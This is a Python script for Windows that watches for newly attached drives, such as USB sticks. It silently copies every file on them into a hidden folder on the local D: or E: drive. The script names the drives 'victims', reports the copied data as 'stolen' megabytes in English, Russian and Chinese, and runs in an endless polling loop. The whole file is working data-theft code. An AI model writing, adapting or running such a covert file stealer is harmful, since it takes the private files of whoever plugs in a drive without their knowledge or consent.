import os
import shutil
import time
import win32api

current = []
roots = 'D:\\######'
rooting = ''
ignored = 0
stolen = 0
cur = [0, 0]
cnt = 0
count = 0
count2 = 0
tot_start = 0
victims = []

text_template: list = [['{} was found.', 'Scanning', '[{}] from [{}]', '{} files and {} directories in total',
                        '\r{:^3.0f}%[{}->{}]{:.2f}s,{} files and {:.2f} Mb remaining. ',
                        "\r100%[{}->]{:.2f}s,0 files and 0 Mb remaining.                                ",
                        '\nCompleted in {:.2f}s.', 'stolen {:.2f} Mb, ignored {:.2f} Mb, {:.2f} Mb in total.'],
                       ['{} был найден', 'сканирует', '[{}] с [{}]', 'всего существует {} файлов и {} каталога',
                        '\r{:^3.0f}%[{}->{}]{:.2f}s,{} файлы и {:.2f} Мб все еще остается.',
                        '\r100%[{}->]{:.2f}s,0 файлы и 0 Mb все еще остается.                                ',
                        'Завершено за {:.2f} секунды.',
                        'украдено {:.2f} Мб, проигнорировано {:.2f} Мб, всего {:.2f} Мб.'],
                       ['检测到 {}', '扫描文件与文件夹', '[{}] 来自 [{}]', '共有{} 个文件和 {} 个目录',
                        '\r{:^3.0f}%[{}->{}]{:.2f}s,{} 个文件、{:.2f} Mb 剩余. ',
                        "\r100%[{}->]{:.2f}s,0 个文件、 0 Mb 剩余.                                ",
                        '\n于 {:.2f}s 内完成。', '攫取了 {:.2f} Mb 文件, 忽略了 {:.2f} Mb 文件, 文件总大小 {:.2f} Mb.']]

file_ini = []


for root in range(ord('C'), ord('Z') + 1):
    try:
        os.listdir(chr(root) + ':\\')
        current.append(chr(root) + ':\\')
    except FileNotFoundError:
        pass
    except PermissionError:
        current.append(chr(root) + ':\\')

try:
    os.mkdir('D:\\######')
except FileExistsError:
    pass
except PermissionError:
    try:
        roots = 'E:\\######'
        os.mkdir('E:\\######')
    except FileExistsError:
        pass
lang = 0


def dfs(source):
    global roots, stolen, ignored
    dirs = os.listdir(source)

    for element in dirs:
        try:
            temp = ''
            temp_list = os.path.join(source, element).split('\\')[1:]
            for i in temp_list[:-1]:
                temp = temp + i + '\\'
            temp = temp + temp_list[-1]
            if os.path.isdir(os.path.join(source, element)):
                os.makedirs(os.path.join(rooting, temp))
                dfs(os.path.join(source, element))
            else:
                if os.path.getsize(os.path.join(source, element)) / 1048576 > 0:
                    stolen += os.path.getsize(os.path.join(source, element)) / 1048576
                    file_ini.append([os.path.join(source, element), os.path.join(rooting, temp),
                                     os.path.getsize(os.path.join(source, element))])
                else:
                    ignored += os.path.getsize(os.path.join(source, element)) / 1048576
        except FileNotFoundError:
            pass


do_exit = False


def controller():
    global cnt, count2
    for i in range(len(file_ini)):
        try:
            cnt += 1
            count2 += file_ini[i][2]
            shutil.copy(file_ini[i][0], file_ini[i][1])
        except:
            continue


def run(root):
    global ignored, stolen, rooting, cnt, cur, tot_start, current, count2, count, file_ini
    disk_info = win32api.GetVolumeInformation("{}:\\".format(root[0]))
    ignored = 0
    stolen = 0
    cur = [0, 0]
    cnt = 0
    count = 0
    count2 = 0
    file_ini.clear()
    t = text_template[lang][2].format(str(time.time()), disk_info[0])
    os.mkdir(os.path.join(roots, t))
    rooting = os.path.join(roots, t)
    dfs(root)
    controller()


while True:
    for root in [chr(x) + ':\\' for x in range(ord('C'), ord('Z') + 1)]:
        try:
            os.listdir(root)
            if root in victims:
                continue
        except FileNotFoundError:
            if root in current:
                current.remove(root)
            try:
                victims.remove(root)
            except ValueError:
                pass
            continue
        except PermissionError:
            if root in current:
                current.remove(root)
            try:
                victims.remove(root)
            except ValueError:
                pass
            continue
        if root in current:
            continue
        # time.sleep(45)
        try:
            run(root)
        except:
            continue
        victims.append(root)
    time.sleep(1)
